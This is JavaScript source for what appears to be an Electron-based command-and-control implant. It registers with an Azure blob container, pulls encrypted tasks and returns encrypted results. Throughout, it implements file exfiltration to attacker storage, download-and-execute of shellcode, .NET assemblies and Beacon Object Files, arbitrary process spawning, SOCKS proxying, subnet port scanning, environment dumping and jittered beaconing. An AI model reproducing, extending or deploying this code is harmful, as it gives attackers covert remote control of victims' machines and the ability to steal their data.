      return new Promise((resolve) => {
        const socket = new net.Socket();
        socket.setTimeout(100); // Timeout after 2 seconds
        socket.on('connect', () => {
          openPorts.push(port);
          socket.destroy();
          resolve();
        });
        socket.on('timeout', () => {
          socket.destroy();
          resolve();
        });
        socket.on('error', () => {
          socket.destroy();
          resolve();
        });
        socket.connect(port, host);
      });
    };
    const portChecks = ports.map(port => checkPort(host, port));
    await Promise.all(portChecks);
    return openPorts;
}
  
async function func_File_Move(srcPath, destPath) {
    let output = "";
    try {
      if (!path.isAbsolute(srcPath)) {
          srcPath = path.resolve(global.agent.cwd, srcPath);
      }
      if (!path.isAbsolute(destPath)) {
          destPath = path.resolve(global.agent.cwd, destPath);
      }
      await fsp.mkdir(path.dirname(destPath), { recursive: true });
      await fsp.rename(srcPath, destPath);
      output = `File moved from ${srcPath} to ${destPath}`;
    } catch (error) {
      output = `Error moving file: ${error.stack}`;
    }
    return output;
}
  
async function func_File_Copy(srcPath, destPath) {
    let output = "";
    try {
      if (!path.isAbsolute(srcPath)) {
          srcPath = path.resolve(global.agent.cwd, srcPath);
      }
      if (!path.isAbsolute(destPath)) {
          destPath = path.resolve(global.agent.cwd, destPath);
      }
      await fsp.mkdir(path.dirname(destPath), { recursive: true });
      await fsp.copyFile(srcPath, destPath);
      output = `File copied from ${srcPath} to ${destPath}`;
    } catch (error) {
      output = `Error copying file: ${error.stack}`;
    }
    return output;
}
  
async function func_File_Read(filePath) {
    try {
        if (!path.isAbsolute(filePath)) {
            filePath = path.resolve(global.agent.cwd, filePath);
        }
        const data = await fsp.readFile(filePath, { encoding: 'utf8' });
        return data; 
    } catch (err) {
        return `[!] ${err}`; 
    }
}

function func_Spawn_Child(command, args = []) {
    return new Promise((resolve, reject) => {
        const proc = spawn(command, args);
        let stdout = "";
        let stderr = "";
        proc.stdout.on('data', (data) => {
            stdout += data.toString();
        });
        proc.stderr.on('data', (data) => {
            stderr += data.toString();
        });
        proc.on('close', (code) => {
            resolve({
                stdout: stdout.trim(),
                stderr: stderr.trim(),
                pid: proc.pid,
                exitCode: code,
                command: `${command} ${args.join(" ")}`
            });
        });
        proc.on('error', (err) => {
            reject(err);
        });
    });
}
  
async function func_Drives_Exist(driveLetter) {
    const path = `${driveLetter}:\\`;
    try {
        await fsp.access(path);
        return true;
    } catch {
        return false;
    }
}
  
async function func_Drives_Stat(driveLetter) {
    const path = `${driveLetter}:\\`;
    try {
      const stats = await fsp.stat(path);
      return stats;
    } catch (error) {
      throw new Error(`Error retrieving stats for ${driveLetter}:: ${error.message}`);
    }
}
  
async function func_Drives_List() {
    const driveLetters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'.split('');
    let resultBuffer = '';
    for (const letter of driveLetters) {
      if (await func_Drives_Exist(letter)) {
        resultBuffer += `Drive: ${letter}:\n`;
        try {
          const stats = await func_Drives_Stat(letter);
          resultBuffer += `Created: ${stats.birthtime}\n`;
          resultBuffer += `Modified: ${stats.mtime}\n`;
        } catch (error) {
          resultBuffer += `${error.message}\n`;
        }
        resultBuffer += '---\n';
      }
    }
    return resultBuffer;
}
  
// link localhost 3000 secret123
function linkHandler(argv) {
    let link_host = argv[1];
    let link_port = argv[2];
    let output = "";
    output = `Linking to ${link_host}:${link_port}\r\n`;
    debug(output);
    global.TCPLinkAgent = new TCPAgent({
        hostname: link_host,
        port: link_port,
        password: global.P2P_CHALLENGE,
        onMessage: async (message) => {
            // Handle incoming messages
            debug(`Received message: ${message}`);
        },
        onConnect: () => {
            debug(`Connected to server`);
        },
        onDisconnect: () => {
            debug(`Disconnected from server`);
        },
        onError: (error) => {
            debug(`Connection error: ${error}`);
        }
    });
    global.TCPLinkAgent.connect();
    return output;
}

// link localhost 3000 secret123
function unlinkHandler(argv) {
    let link_host = argv[1];
    let output = "";
    if (link_host === global.TCPLinkAgent.hostname) {
        output = `Unlinking from ${link_host}`;
        debug(output);
        global.TCPLinkAgent.disconnect();
    } else {
        output = `Not linked to ${link_host}`;
        debug(output);
    }
    return output;
}
  
async function ls(dirPath) {
    try {
        if (!path.isAbsolute(dirPath)) {
            dirPath = path.resolve(global.agent.cwd, dirPath);
        }
        const filesAndFolders = await fsp.readdir(dirPath, { withFileTypes: true });
        for (const entry of filesAndFolders) {
            const fullPath = path.join(dirPath, entry.name);
              const stats = await fsp.stat(fullPath);
              entry.stats = stats;
              entry.type = entry.isDirectory() ? 'Directory' : 'File';
        }
        return JSON.stringify(filesAndFolders);
    } catch (error) {
        debug('Error reading directory:', error);
        return 'Error reading directory.';
    }
}
  
function dnsHandler(command) {
    return new Promise((resolve) => {
      let data = '';
      try {
          const parts = command.split(' ');
  
          if (parts.length < 2) {
              data += 'Invalid command\r\n';
              return resolve(data);
          }
          if (parts[1].startsWith('@')) {
              const server = parts[1].substring(1);
              if (server.toLowerCase() === "default") {
                  customDnsServer = null;
                  dns.setServers(dns.getServers());
                  data += "Reset to system default DNS servers\r\n";
              } else {
                  customDnsServer = server;
                  dns.setServers([server]);
                  data += `Using custom DNS server: ${server}\r\n`;
              }
              return resolve(data);
          }
          const resolver = customDnsServer ? new dns.Resolver() : dns;
          if (customDnsServer) resolver.setServers([customDnsServer]);
          switch (parts[1]) {
              case 'lookup':
                  if (parts[2]) {
                      if (parts.includes('-all')) {
                          let hostname = parts[2];
                          let pendingLookups = 7; // Total lookups being performed
                          // check when all lookups are done
                          const finalize = () => {
                              pendingLookups--;
                              if (pendingLookups === 0) {
                                  resolve(data);
                              }
                          };
                          // Resolve IP Address
                          resolver.lookup(hostname, (err, address, family) => {
                              data += err ? `Error resolving IP: ${err.message}\r\n` 
                                          : `Resolved IP: ${address}, Family: IPv${family}\r\n`;
                              finalize();
                          });
                          // Resolve A (IPv4) & AAAA (IPv6)
                          resolver.resolve4(hostname, (err, addresses) => {
                              data += err ? `Error resolving A record: ${err.message}\r\n`
                                          : `A (IPv4) Records: ${addresses.join(', ')}\r\n`;
                              finalize();
                          });
                          // Resolve MX Records
                          resolver.resolveMx(hostname, (err, addresses) => {
                              data += err ? `Error resolving MX records: ${err.message}\r\n`
                                          : `MX Records: ${JSON.stringify(addresses, null, 2)}\r\n`;
                              finalize();
                          });
                          // Resolve TXT Records
                          resolver.resolveTxt(hostname, (err, records) => {
                              data += err ? `Error resolving TXT records: ${err.message}\r\n`
                                          : `TXT Records: ${JSON.stringify(records, null, 2)}\r\n`;
                              finalize();
                          });
                          // Resolve CNAME Records
                          resolver.resolveCname(hostname, (err, records) => {
                              data += err ? `Error resolving CNAME records: ${err.message}\r\n`
                                          : `CNAME Records: ${records.join(', ')}\r\n`;
                              finalize();
                          });
                          // Resolve NS Records
                          resolver.resolveNs(hostname, (err, records) => {
                              data += err ? `Error resolving NS records: ${err.message}\r\n`
                                          : `NS Records: ${records.join(', ')}\r\n`;
                              finalize();
                          });
                      } else {
                          resolver.lookup(parts[2], (err, address, family) => {
                              data += err ? `Error: ${err.message}\r\n` 
                                          : `IP Address: ${address}, Family: IPv${family}\r\n`;
                              resolve(data);
                          });
                      }
                  } else {
                      data += 'Usage: dns lookup <hostname> [-all | -mx | -txt | -cname]\r\n';
                      resolve(data);
                  }
                  break;
                case 'resolve':
                  if (parts[2]) {
                      resolver.resolve(parts[2], (err, addresses) => {
                          data += err ? `Error: ${err.message}\r\n` 
                                      : `IP Addresses: ${addresses.join(', ')}\r\n`;
                          resolve(data);
                      });
                  } else {
                      data += 'Usage: dns resolve <hostname>\r\n';
                      resolve(data);
                  }
                  break;
              case 'reverse':
                  if (parts[2]) {
                      resolver.reverse(parts[2], (err, hostnames) => {
                          data += err ? `Error: ${err.message}\r\n` 
                                      : `Hostnames: ${hostnames.join(', ')}\r\n`;
                          resolve(data);
                      });
                  } else {
                      data += 'Usage: dns reverse <ip-address>\r\n';
                      resolve(data);
                  }
                  break;
              case 'config':
                  try {
                      data += `Current DNS Servers: ${dns.getServers().join(', ')}\r\n`;
                  } catch (error) {
                      data += `Error retrieving DNS config: ${error.message}\r\n`;
                  }
                  resolve(data);
                  break;
              default:
                  data += 'Unknown command\r\n';
                  resolve(data);
          }
      } catch (error) {
          data += `Unexpected error: ${error.message}\r\n${error.stack}\r\n`;
          resolve(data);
      }
  });
}

async function func_File_Read_ToBuffer(filePath) {
    try {
        const fileBuffer = await fsp.readFile(filePath);
        return fileBuffer;
    } catch (error) {
        debug(`Error reading file: ${error}`);
        return "";
    }
}

async function func_Azure_Upload_File(srcpath, uploadblob) 
{
    try {
        debug(`browser.js | func_Azure_Upload_File() hit`);
        let bufferfile = await func_File_Read_ToBuffer(srcpath);
        let enc = await func_Encrypt(bufferfile, global.agent.container.key['key'], global.agent.container.key['iv']);

        const response = await func_Web_Request(
            {
                hostname: global.agent.storageAccount,
                port: 443,
                path: `/${global.agent.container.name}/${uploadblob}?${global.agent.sasToken}`,
                method: 'PUT',
                headers: {
                  'x-ms-blob-type': 'BlockBlob',
                  'Content-Type': 'application/octet-stream'
                }
            }, enc, true);
        if (response.status != 201) {
            output = `Couldnt upload file, response: ${response.status}`;
            debug(output);
        } else {
            output = `Successfully uploaded file ${srcpath} to https://${global.agent.storageAccount}/${global.agent.container.name}/${uploadblob} blob`;
            debug(output);
        }
    } catch (error) {
          output = `Error uploading file ${srcpath} to azure : ${error.stack}`;
          debug(output);
    }
}

async function func_Azure_File_Download(downloadblob, dstpath) 
{
    let output = "";
    try {
        const options = {
            hostname: global.agent.storageAccount,
            port: 443,
            path: `/${global.agent.container.name}/${downloadblob}?${global.agent.sasToken}`,
            method: 'GET'
        }
        const downloadResponse = await func_Web_Request(options, null, true);
        debug(`response status: ${downloadResponse.status}`);
        if (downloadResponse.status !== 200) {
            output = `Couldn't download file, response: ${downloadResponse.status}`;
            debug(output);
            return output;
        } else {
            const raw = await func_Decrypt(Buffer.from(downloadResponse.data), global.agent.container.key['key'], global.agent.container.key['iv']);
            await fsp.writeFile(dstpath, raw);
            output = `File ${dstpath} has been saved`;
            debug(output);
            return output;
        }
    } catch (error) {
        output = `func_Azure_File_Download: Error downloading file: ${error.message} ${error.stack}`;
        debug(output);
        return output;
    }
}

async function func_spawn_socks_proxy(url) 
{
    debug(`main.js | func_spawn_socks_proxy`);
    let output = "";
    try {
        let socksWindow = await createWindow();
        await new Promise((resolve) => {
            if (socksWindow.webContents) {
                socksWindow.webContents.on('did-finish-load', resolve);
            } else {
                resolve();
            }
        });
        const responsePromise = new Promise((resolve) => {
            ipcMain.once('socks-complete', (event, result) => {
                resolve(result);
            });
        });
        socksWindow.webContents.send('socks-proxy', url);
        output = await responsePromise;
        return output;
    } catch (error) {
        debug(`func_spawn_socks_proxy: Error : ${error.message}`);
        throw error;
    }
}

async function func_Azure_Download_Exec(scexecblob) 
{
  debug(`[MAIN][SCEXEC]`);
  let output = "";
  try {
    const response = await func_Web_Request({
      hostname: global.agent.storageAccount,
      port: 443,
      path: `/${global.agent.container.name}/${scexecblob}?${global.agent.sasToken}`,
      method: 'GET'
      },
      null,
      true
    );
    if (response.status !== 200) {
      output = `Couldn't download file, response: ${response.status}`;
      debug(output);
      return output;
    } else {
      debug(`response status: ${response.status}`);
      const raw = await func_Decrypt(Buffer.from(response.data), global.agent.container.key['key'], global.agent.container.key['iv']);
      debug(`[MAIN][SCEXEC]DECRYPT`);
      let execWindow = await createWindow();
      await new Promise(resolve => {
        if (execWindow && execWindow.webContents) {
          execWindow.webContents.on('did-finish-load', resolve);
        } else {
          resolve(); // Resolve immediately if window not available
        }
      });
      debug(`[MAIN][SCEXEC]CREATE WINDOW`);
      const responsePromise = new Promise(resolve => {
        ipcMain.once('scexec-complete', (event, result) => {
          debug(`[MAIN][SCEXEC]SCEXEC-COMPLETE`);
          resolve(result);
        });
      });
      execWindow.webContents.send('execute-scexec-node', global.scexecNodePath, raw);
      const result = await responsePromise;
      debug(`func_Azure_File_Download_Exec result: ${result}`);
    }
  } catch (error) {
    output = `func_Azure_Download_Exec: Error downloading executable: ${error.message} ${error.stack}`;
    debug(output);
    return output;
  }
}

async function func_Azure_Assembly_Download_Exec(scexecblob, args) {
  debug(`assembly.js | func_Azure_Assembly_Download_Exec`);
  let output = "";
  try {
    const response = await func_Web_Request({
      hostname: global.agent.storageAccount,
      port: 443,
      path: `/${global.agent.container.name}/${scexecblob}?${global.agent.sasToken}`,
      method: 'GET'
      },
      null,
      true
    );
    if (response.status !== 200) {
      output = `Couldn't download file, response: ${response.status}`;
      debug(output);
      return output;
    } else {
      debug(`response status: ${response.status}`);
      const raw = await func_Decrypt(Buffer.from(response.data), global.agent.container.key['key'], global.agent.container.key['iv']);
      // Create execution window and wait for it to load
      let execWindow = await createWindow();
      await new Promise(resolve => {
        if (execWindow && execWindow.webContents) {
          execWindow.webContents.on('did-finish-load', resolve);
        } else {
          resolve(); // Resolve immediately if window not available
        }
      });
      // Set up response handler
      const responsePromise = new Promise(resolve => {
        ipcMain.once('assembly-complete', (event, result) => {
          resolve(result);
        });
      });
      const argv = await func_Split_Quoted_String(args);
      execWindow.webContents.send('execute-assembly-node', global.assemblyNodePath, raw, argv);
      const result = await responsePromise;
      debug(`[+] main.js | func_Azure_Assembly_Download_Exec | result:\r\n ${result}`);
      execWindow.close();
      return result;
    }
  } catch (error) {
    output = `func_Azure_Assembly_Download_Exec:Error downloading assembly: ${error.message} ${error.stack}`;
    debug(output);
    return output;
  }
}


async function func_Azure_BOF_Download_Exec(task, argv) 
{
    debug(`[MAIN][BOF] taskid: ${task.taskid}`);
    let output = "";
    try {
      const response = await func_Web_Request({
        hostname: global.agent.storageAccount,
        port: 443,
        path: `/${global.agent.container.name}/${task.uploadChannel}?${global.agent.sasToken}`,
        method: 'GET'
        },
        null,
        true
      );
      if (response.status !== 200) {
        output = `Couldn't download file, response: ${response.status}`;
        debug(output);
        return output;
      } else {
        debug(`response status: ${response.status}`);
        const bof_data = await func_Decrypt(Buffer.from(response.data), global.agent.container.key['key'], global.agent.container.key['iv']);
        // Create execution window and wait for it to load
        let execWindow = await createWindow();
        await new Promise(resolve => {
          if (execWindow && execWindow.webContents) {
            execWindow.webContents.on('did-finish-load', resolve);
          } else {
            resolve(); // Resolve immediately if window not available
          }
        });
        // Set up response handler
        const responsePromise = new Promise(resolve => {
          ipcMain.once('bof-complete', (event, result) => {
            resolve(result);
          });
        });
        debug(`[MAIN][BOF] ARGV: ${argv}`);
        let functionName = argv[2];
        let formatString = argv[3];
        const formatArgs = argv.slice(4);

        if (functionName === undefined) {
            functionName = "go";
        }
        if (formatString === undefined) {
            formatString = "";
        }

        execWindow.webContents.send('execute-bof-node', global.path_coffloader, bof_data, functionName, formatString, formatArgs);
        const result = await responsePromise;
        // Convert Uint8Array result to ASCII string
        const asciiResult = Buffer.from(result.output).toString('ascii');
        debug(`[+] main.js | func_Azure_BOF_Download_Exec | result:\r\n ${asciiResult}`);
        execWindow.close();
        return asciiResult;
      }
    } catch (error) {
      output = `[BOF] Error downloading bof: ${error.message} ${error.stack}`;
      debug(output);
      return output;
    }
}


async function func_cd(newPath) {
    try {
        let targetPath;
        let currentPath = global.agent.cwd;
        if (newPath == undefined) { newPath = os.homedir(); }
        if (path.isAbsolute(newPath)) {
            targetPath = newPath;
        } else {
            if (newPath.startsWith('./') || newPath.startsWith('.\\')) {
                newPath = newPath.substring(2);
            }
            while (newPath.startsWith('../') || newPath.startsWith('..\\')) {
                currentPath = path.dirname(currentPath);
                newPath = newPath.substring(3);
            }
            targetPath = path.join(currentPath, newPath);
        }
        targetPath = path.normalize(targetPath);
        try {
            const stats = await fsp.stat(targetPath);
            if (!stats.isDirectory()) {
                return `[!] Error: ${targetPath} is not a directory`;
            }
        } catch (error) {
            return `[!] Error: Directory ${targetPath} does not exist`;
        }
        global.agent.cwd = targetPath;
        return `Changed directory to ${global.agent.cwd}`;
    } catch (error) {
        debug(`[!] Error in func_cd: ${error.message}${error.stack}`);
        return `[!] Error changing directory: ${error.message}`;
    }
}

// Function to simulate doing some work with the blob content
async function func_Command_Handler(task, argv) 
{
  try
  {
    if ( task.command != "")
    {
        const cmd = task.command;
        if (!argv) {
            argv = await func_Split_Quoted_String(task.command);
        }
        if (argv[0] != "")
        {
          let data;
          const arg1 = argv.length > 0 ? argv[1] : '';
          const args = Array.isArray(argv) ? argv.slice(2) : [];
          if (argv[0] === 'sleep') {
            if (!global.agent.sleepinterval) {
                global.agent.sleepinterval = 5;
            }
            if (global.agent.sleepinterval) {
                global.agent.sleepinterval = await numcheck(Number(argv[1]), 5, 0, 900);
                global.agent.sleepjitter = await numcheck(Number(argv[2]), 15, 0, 300);
                data = `Sleeping for ${global.agent.sleepinterval}s with ${global.agent.sleepjitter}% jitter.`;
            } else {
                data = `[!] Error : global.agent.sleepinterval doesn't exist.`;
            }
          } else if (argv[0] === 'download') {
            let srcpath = argv[1];
            let pushblob = argv[2];
            await func_Azure_Upload_File(srcpath, pushblob);
            data = "Download completed";
          } else if (argv[0] === 'upload') {
            let pullblob = argv[1];
            let dstpath = argv[2];
            await func_Azure_File_Download(pullblob, dstpath);
            data = "Upload completed";
          } else if (argv[0] === 'load') {
            const path = argv[1];
            if (!path) {
                data = '[!] Error: No path provided for load command';
            } else {
                global.mainWindow.webContents.send('load', path);
                data = "Load command sent";
            }
          } else if (argv[0] === 'scexec') {
            let encscblob = argv[1];
            data = await func_Azure_Download_Exec(encscblob);
          } else if (argv[0] === 'assembly') {
            let encscblob = argv[1];
            let args = cmd.slice(22);
            data = await func_Azure_Assembly_Download_Exec(encscblob, args);
          } else if (argv[0] === 'bof') {
            debug(`[MAIN][DOTASK] argv : ${JSON.stringify(argv)}`);
            data = await func_Azure_BOF_Download_Exec(task, argv);
          } else if (argv[0] === 'socks') {
            let url = argv[1];
            data = await func_spawn_socks_proxy(url);
          } else if (argv[0] == 'spawn') {
              debug(`[MAIN][COMMAND] command: ${arg1}`);
              debug(`[MAIN][COMMAND] args   : ${args}`);
              data = await func_Spawn_Child(arg1, args);
              data = data.stdout;
              debug(`[MAIN][COMMAND] Command Output: ${data}`);
          } else if (argv[0] == 'scan') {
            const host = argv[1];
            const portsArg = argv.find(arg => arg.startsWith('-p'));
            const ports = portsArg ? portsArg.substring(2).split(',').map(Number) : [80, 443]; // Default ports if not specified
            
            const isCIDR = host.includes('/');
            if (isCIDR) {
              const [base, mask] = host.split('/');
              const baseIP = base.split('.').map(Number);
              const range = 1 << (32 - Number(mask));
              const openPorts = [];
  
              for (let i = 0; i < range; i++) {
                const ip = baseIP.slice();
                ip[3] += i;
                const ipStr = ip.join('.');
                const result = await func_Scan_Ports(ipStr, ports);
                openPorts.push(`${ipStr}: ${result.join(', ')}`);
              }
              data = openPorts.join('\n');
            } else {
              const result = await func_Scan_Ports(host, ports);
              data = `${host}: ${result.join(', ')}`;
            }
          } else if (argv[0] == 'dns') {
            data = await dnsHandler(cmd);
          } else if (argv[0] == 'link') {
            data = linkHandler(argv);
          } else if (argv[0] == 'unlink') {
            data = unlinkHandler(argv);
          } else if (argv[0] == 'set') {
            if (argv[1] == 'scexec_path') {
              global.scexecNodePath   = argv[2];
              data = `SCEXEC Node Load Path Set to : ${global.scexecNodePath}`;
              debug(data);
            } else if (argv[1] == 'assembly_path') {
              global.assemblyNodePath = argv[2];
              data = `Assembly Node Load Path Set to : ${global.assemblyNodePath}`;
              debug(data);
            } else if (argv[1] == 'bof_path') {
              global.path_coffloader = argv[2];
              data = `BOF Node Load Path Set to : ${global.path_coffloader}`;
              debug(data);
            } else {
              data = `SCEXEC Node Load Path Set to : ${global.scexecNodePath}\r\nAssembly Node Load Path Set to : ${global.assemblyNodePath}`;
              debug(data);
            }
          } else if (argv[0] == 'drives') {
            data = await func_Drives_List();
          } else if (argv[0] == 'ls') {
            let path;
            if (typeof argv[1] === 'undefined') {
              path = ".";
            } else {
              path = argv[1];
            }
            data = await ls(path);
          } else if (argv[0] == 'env') {
            let env = process.env;
            data = JSON.stringify(env, null, 2);
          } else if (argv[0] == 'cat') {
            file = argv[1];
            data = await func_File_Read(file);
          } else if (argv[0] == 'pwd') {
            data = global.agent.cwd;
          } else if (argv[0] == 'cd') {
            data = await func_cd(argv[1]);
          } else if (argv[0] == 'exit') {
            app.quit();
            process.exit(0);
          } else if (argv[0] == 'mv') {
            src = argv[1];
            dest = argv[2];
            data = await func_File_Move(src,dest);
          } else if (argv[0] == 'cp') {
            src = argv[1];
            dest = argv[2];
            data = await func_File_Copy(src,dest);
          }
          return data;
        }
    }
    return "";
  } catch (error) {
    debug(`[MAIN][COMMAND] Error: ${error} ${error.stack}`);
    return `Error: ${error.message}${error.stack}`;
  }
}

// Add this near the top with other IPC handlers
ipcMain.on('load-complete', (event, result) => {
    debug(`[LOAD] Load operation completed: ${result}`);
});

async function parseTask(encryptedTask) {
    try {
        const decodedTask = await func_Base64_Decode(encryptedTask);
        if (!decodedTask) {
            debug('[PARSE] Failed to decode base64 task');
            return null;
        }
        const decryptedTask = await func_Decrypt(decodedTask, global.agent.container.key['key'], global.agent.container.key['iv']);
        if (!decryptedTask) {
            debug('[PARSE] Failed to decrypt task');
            return null;
        }
        debug(`[PARSE] Decrypted task: ${decryptedTask}`);
        const taskObj = JSON.parse(decryptedTask);
        const task = new Task(
            taskObj.outputChannel,
            taskObj.command,
            taskObj.uploadChannel,
            taskObj.taskid
        );
        debug(`[PARSE] Parsed task: ${JSON.stringify(task)}`);
        return task;
    } catch (error) {
        debug(`[PARSE] Error parsing task: ${error}`);
        return null;
    }
}

async function DoTask(task) {
    try {
        if (!task || typeof task.command !== 'string' || !task.command.trim()) {
            debug('[TASK] Invalid task payload');
            return false;
        }
        let command_output = "";
        const argv = await func_Split_Quoted_String(task.command);
        if (!argv || argv.length === 0) {
            return false;
        }
        
        command_output = await func_Command_Handler(task, argv);
        
        if (command_output) {
            command_output = await func_Encrypt(command_output, global.agent.container.key['key'], global.agent.container.key['iv']);
            command_output = await func_Base64_Encode(command_output);
            await send_output(global.agent.container.name, task.outputChannel, command_output);
        }
        return true;
    } catch (error) {
        debug(`${error} ${error.stack}`);
        return false;
    }
}


async function init() {
    try {
        let response = null;
        let blobs = global.agent.container.blobs;
        // Create the metaContainer if it doesn't exist
        debug(`[INIT] Creating metaContainer ${global.agent.metaContainer}`);
        response = await func_Container_Create(global.agent.metaContainer);
        if (response === false) {
            debug(`[INIT][!] Failed to create meta container : ${global.agent.metaContainer}`);
            return false;
        }
        // Create the metacontainer blob for this agent. Used to register the agent to the client dashboard table
        debug(`[INIT] Creating metaContainer blob /${global.agent.metaContainer}/${global.agent.agentid}`);
        response = await func_Blob_Create(global.agent.metaContainer, global.agent.agentid, global.agent.container.name);
        if(response === false) {
            debug(`[INIT][!] Failed to create meta container blob : ${global.agent.metaContainer} ${global.agent.agentid}`);
            return false;
        }
        response = await Blob_Set_Metadata(
          global.agent.metaContainer, 
          global.agent.agentid, 
          {
            stat:      Date.now(),
            signature: await func_Base64_Encode(JSON.stringify(global.agent.container.key.key)),
            hash:      await func_Base64_Encode(JSON.stringify(global.agent.container.key.iv)),
            link:      global.agent.agentid
          }
        );
        if(response.status != 200) {
            debug(`[INIT][!] Failed to set metadata for meta container blob : ${global.agent.metaContainer} ${global.agent.agentid}`);
            return false;
        }
        // Create agent container
        debug(`[INIT] Creating agent container ${global.agent.container.name}`);
        response = await func_Container_Create(global.agent.container.name);
        if (response === false) {
            debug(`[INIT][!] Failed to create agent container : ${global.agent.container.name}`);
            return false;
        }
        // Create input blob
        response = await func_Blob_Create(global.agent.container.name, blobs['in']);
        if(response === false) {
            debug(`[INIT][!] Failed to create container blob ${global.agent.container.name} ${blobs['in']}`);
            return false;
        }
        // Create checkin blob
        let selfInfo = await getSystemInfo();
        const checkin_encryptedData = await func_Encrypt(JSON.stringify(selfInfo, null, 1), global.agent.container.key.key, global.agent.container.key.iv);
        const checkin_b64EncData = await func_Base64_Encode(checkin_encryptedData);
        response = await func_Blob_Create(global.agent.container.name, blobs['checkin'], checkin_b64EncData);
        if(response === false) {
            debug(`[INIT][!] Failed to create container blob ${global.agent.container.name} ${blobs['checkin']}`);
            return false;
        }
        return true;
    } catch (error) {
        debug(`[INIT][!] ERROR : \r\n${error}\r\n ${error.stack}`);
        return false;
    }
}

async function reinitializeAgent() {
  debug(`[REINIT] Reinitializing agent`);
  global.init = false;
  let failattempts = 0;

  while (true) {
      let initResult = await init();
      if (initResult === true) {
          debug('[REINIT] Initialization successful');
          break;
      }
      else{
          failattempts++;
          debug(`[REINIT] Initialization failed for ${failattempts} time, retrying in 10 seconds... `);
          await new Promise(resolve => setTimeout(resolve, 10000));
      }
  }
}

async function TaskLoop() {
  while (true) {
    try {
      await taskLoopIteration();
      return;
    } catch (error) {
      debug(`[TASKLOOP] Recoverable error: ${error} ${error.stack}`);
      global.init = false;
      await new Promise(resolve => setTimeout(resolve, 10000));
    }
  }
}

async function taskLoopIteration() {
  try{
    debug(`[TASKLOOP] Starting task handler`);
    while (true) {
        if (!global.init) {
            let agentidresp = await func_Blob_Read(global.agent.metaContainer, global.agent.agentid);
            debug(`[TASKLOOP] func_Blob_Read response : ${JSON.stringify(agentidresp)}`);
            if (agentidresp.status === 200) {
                if (agentidresp.data == global.agent.container.name) {
                    debug(`[TASKLOOP] Agents metaContainer global.agent.agentid ${global.agent.agentid} is initialized with value ${agentidresp.data}`);
                    global.init = true;
                }
            }

        }else{
            let response = await Blob_Set_Metadata(
              global.agent.metaContainer, 
              global.agent.agentid, 
              {
                stat:      Date.now(),
                signature: await func_Base64_Encode(JSON.stringify(global.agent.container.key.key)),
                hash:      await func_Base64_Encode(JSON.stringify(global.agent.container.key.iv)),
                link:      global.agent.agentid
              }
            );
            if (global.mode== 'link-tcp' && response === false) {
                debug(`[TASKLOOP] ${global.TCPServer.authenticatedClients.size} clients authenticated.\r\n Waiting for client to connect and authenticate...`);
                const clientConnected = await global.TCPServer.waitForClient();
                if (clientConnected) {
                  debug('Client connected and authenticated successfully');
                  debug(`[TASKLOOP] ClientConnected : ${clientConnected}`);
                }
            }
            if (response != false) {
              if(response.status != 200) { 
                await reinitializeAgent(); 
              }
              if( await HandleTask() === false) 
              { 
                await reinitializeAgent(); 
              }
            }
        }
        if (900 * 1000 > global.agent.thissleep && global.agent.thissleep > 1 * 888) {
            global.agent.thissleep = await getrand(global.agent.sleepinterval * 1000, global.agent.sleepjitter);
            debug(`[TASKLOOP] Sleeping for ${global.agent.thissleep}`);
            await new Promise(resolve => setTimeout(resolve, global.agent.thissleep));
        } else {
            debug('[TASKLOOP] Sleeping for default 10 seconds');
            await new Promise(resolve => setTimeout(resolve, 10000));
        }
    }
  }catch(error){
    throw error;
  }
}

async function HandleTask() {
    try {
        let response = await func_Blob_Read(global.agent.container.name ,global.agent.container.blobs['in']);
        if (response.status === 200) {
            if (response.data && response.data != null && response.data != undefined && response.data != "") {
                let task = await parseTask(response.data);
                if (!task) return false;
                const completed = await DoTask(task);
                if (!completed) return false;
            } 
            await clearBlob(global.agent.container.name, global.agent.container.blobs['in']);
            return true;
        }else{
            return false;
        }
    } catch (error) {
        debug(`[!] ${error} ${error.stack}`);
        return false;
    }
}
